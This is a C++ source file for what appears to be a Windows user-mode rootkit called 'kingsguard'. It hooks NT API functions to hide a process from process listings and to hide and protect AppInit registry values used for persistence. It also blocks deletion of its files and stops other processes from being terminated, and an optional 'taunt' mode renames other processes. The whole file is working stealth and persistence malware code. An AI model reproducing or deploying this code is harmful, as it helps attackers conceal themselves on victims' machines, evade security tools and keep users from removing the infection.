#include "kingsguard.h"

NTSTATUS WINAPI HookedNtDeleteValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueName)
{
    if (ValueName->Length > 3)
    {
        std::wstring w_name = std::wstring(ValueName->Buffer);
        // std::transform(w_name.begin(), w_name.end(), ::tolower);
        if (CheckExists(w_name, L"appinit", false) || CheckExists(w_name, KEY, false))
            return STATUS_OBJECT_NAME_NOT_FOUND;
    }

    return OriginalNtDeleteValueKey(KeyHandle, ValueName);
}

// NTSTATUS WINAPI HookedNtSetValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueName, ULONG TitleIndex, ULONG Type, PVOID Data, ULONG DataSize)
// {
//     if (ValueName->Length > 3)
//     {
//         std::wstring w_name = std::wstring(ValueName->Buffer);
//         // std::transform(w_name.begin(), w_name.end(), ::tolower);
//         if (CheckExists(w_name, L"AppInit", false) || CheckExists(w_name, KEY, false)) 
//             return STATUS_ACCESS_DENIED;
//     }

//     return OriginalNtSetValueKey(KeyHandle, ValueName, TitleIndex, Type, Data, DataSize);
// }

NTSTATUS WINAPI HookedNtOpenFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, ULONG ShareAccess, ULONG OpenOptions)
{
    if (DesiredAccess & DELETE && ObjectAttributes->ObjectName->Length > 1)
    {
        std::wstring w_name = std::wstring(ObjectAttributes->ObjectName->Buffer);
        // std::transform(w_name.begin(), w_name.end(), ::tolower);
        if (CheckExists(w_name, PATH, false))
            return STATUS_ACCESS_DENIED;
    }

    return OriginalNtOpenFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);
}

NTSTATUS WINAPI HookedNtQueryValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueName, NT_KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass, PVOID KeyValueInformation, ULONG Length, PULONG ResultLength)
{
    if (ValueName->Length > 3)
    {
        std::wstring w_name = std::wstring(ValueName->Buffer);
        // std::transform(w_name.begin(), w_name.end(), ::tolower);
        if (CheckExists(w_name, L"appinit", false) || CheckExists(w_name, KEY, false))
            return STATUS_OBJECT_NAME_NOT_FOUND;
    }
    return OriginalNtQueryValueKey(KeyHandle, ValueName, KeyValueInformationClass, KeyValueInformation, Length, ResultLength);
}

NTSTATUS WINAPI HookedNtEnumerateValueKey(HANDLE key, ULONG index, NT_KEY_VALUE_INFORMATION_CLASS keyValueInformationClass, LPVOID keyValueInformation, ULONG keyValueInformationLength, PULONG resultLength)
{
    NTSTATUS status = OriginalNtEnumerateValueKey(key, index, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);

    if (status == ERROR_SUCCESS && (keyValueInformationClass == KeyValueBasicInformation || keyValueInformationClass == KeyValueFullInformation))
    {
        for (ULONG i = 0, newIndex = 0; newIndex <= index && status == ERROR_SUCCESS; i++)
        {
            status = OriginalNtEnumerateValueKey(key, i, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);

            std::wstring w_name = std::wstring(KeyValueInformationGetName(keyValueInformation, keyValueInformationClass));
            // std::transform(w_name.begin(), w_name.end(), ::tolower);
            // if (name.find(L"AppInit") == std::wstring::npos && name.find(L"KsGuard") == std::wstring::npos)
            if (CheckExists(w_name, L"appinit", true) && CheckExists(w_name, KEY, true))
                newIndex++;
        }
    }

    return status;
}

NTSTATUS WINAPI HookedNtTerminateProcess(HANDLE hProcess, UINT code)
{
    if (GetProcessId(GetCurrentProcess()) == GetProcessId(hProcess))
        return OriginalNtTerminateProcess(hProcess, code);

    return 1;
}

NTSTATUS WINAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
{
    NTSTATUS status = OriginalNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

    if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status)
    {
        PMY_SYSTEM_PROCESS_INFORMATION prev = PMY_SYSTEM_PROCESS_INFORMATION(SystemInformation);
        PMY_SYSTEM_PROCESS_INFORMATION curr = PMY_SYSTEM_PROCESS_INFORMATION((PUCHAR)prev + prev->NextEntryOffset);

        while (prev->NextEntryOffset != 0)
        {
            std::wstring w_name = std::wstring(curr->ImageName.Buffer);
            if (CheckExists(w_name, PROCESS, false))
            {
                if (curr->NextEntryOffset == 0)
                    prev->NextEntryOffset = 0;
                else
                    prev->NextEntryOffset += curr->NextEntryOffset;
                curr = prev;
            }
            else if (TAUNT)
            {
                WriteProcessMemory(GetCurrentProcess(), curr->ImageName.Buffer, L"kingsguard", curr->ImageName.Length, NULL);
            }
            prev = curr;
            curr = PMY_SYSTEM_PROCESS_INFORMATION((PUCHAR)curr + curr->NextEntryOffset);
        }
    }
    return status;
}